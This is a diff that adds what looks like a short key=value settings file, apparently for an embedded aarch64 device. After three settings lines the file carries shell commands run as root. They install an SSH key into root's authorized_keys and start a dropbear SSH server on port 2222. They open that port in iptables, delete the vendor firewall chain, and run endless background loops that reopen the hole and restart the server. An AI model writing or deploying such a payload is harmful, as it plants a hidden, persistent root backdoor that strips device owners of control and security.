@@ -1,0 +1,14 @@
+runSignal=PFM
+runCount=99
+runMaxCount=1
+mkdir -p /var/local/.a6q_root
+{ id; date; uname -a; } > /var/local/.a6q_root/proof.txt 2>&1
+chmod 644 /var/local/.a6q_root/proof.txt
+mkdir -p /root/.ssh
+cp /var/local/.a6q_authorized_keys /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys
+( exec > /var/local/.a6q_root/v12.log 2>&1; echo "== start $(date)"; md5sum /var/local/dropbear; echo "expect:b13ccc408b80a73c57c0992ac31f5c47"; chmod 755 /var/local/dropbear; cp /var/local/dropbear /tmp/.a6q_db 2>&1; chmod 755 /tmp/.a6q_db 2>&1; ok=0; i=0; while [ $i -lt 40 ]; do if iptables -I INPUT 1 -p tcp --dport 2222 -j ACCEPT; then ok=1; break; fi; sleep 2; i=$((i+1)); done; echo "ipt-loop=$i ok=$ok"; iptables -S INPUT 2>&1 | head -5; echo "== EULA chain:"; iptables -L FIREWALL_IN_EULAON -n -v 2>&1 | head -40; echo "== try aarch64 exec:"; /var/local/dropbear -p 2222 -F -R -r /var/local/.a6q_host_ed25519 & dp=$!; sleep 3; if kill -0 $dp 2>/dev/null; then echo "aarch64-ALIVE"; else echo "aarch64-dead; sleeping 55s for v9 redelivery then retry"; sleep 55; md5sum /var/local/dropbear; /var/local/dropbear -p 2222 -F -R -r /var/local/.a6q_host_ed25519 & dp=$!; sleep 3; if kill -0 $dp 2>/dev/null; then echo "retry-ALIVE"; else echo "retry-DEAD; try /tmp copy"; /tmp/.a6q_db -p 2222 -F -R -r /var/local/.a6q_host_ed25519 & dp=$!; sleep 3; kill -0 $dp 2>/dev/null && echo "tmpcopy-ALIVE" || echo "tmpcopy-DEAD"; fi; fi; echo "== procnet:"; grep -i ":08AE" /proc/net/tcp /proc/net/tcp6; echo "== done $(date)" ) &
+(sh -c "sleep 5; mkdir -p /var/local/pfmParse/Data; cp /var/local/.a6q_PFMCheck_backup /var/local/pfmParse/PFMCheck; cp /var/local/.a6q_platform_backup /var/local/pfmParse/Data/platform.txt; touch /var/local/DebugPowerup") &
+(sh -c "while true; do sleep 30; touch /var/local/DebugPowerup 2>/dev/null; done") &
+(sh -c 'exec > /var/local/.a6q_root/fw_loop.log 2>&1; while true; do iptables -C INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null || iptables -I INPUT 1 -p tcp --dport 2222 -j ACCEPT 2>/dev/null; iptables -D INPUT -j FIREWALL_IN_EULAON 2>/dev/null; grep -qi ":08AE" /proc/net/tcp 2>/dev/null || { chmod 755 /var/local/dropbear 2>/dev/null; [ -f /var/local/dropbear ] && { /var/local/dropbear -p 2222 -F -R -r /var/local/.a6q_host_ed25519 & echo "started dropbear $(date)" >> /var/local/.a6q_root/fw_loop.log; }; }; sleep 15; iptables -S INPUT > /var/local/.a6q_root/fw_now.txt 2>&1; iptables -L FIREWALL_IN_EULAON -n 2>&1 | head -25 >> /var/local/.a6q_root/fw_now.txt; date >> /var/local/.a6q_root/fw_now.txt; done') &
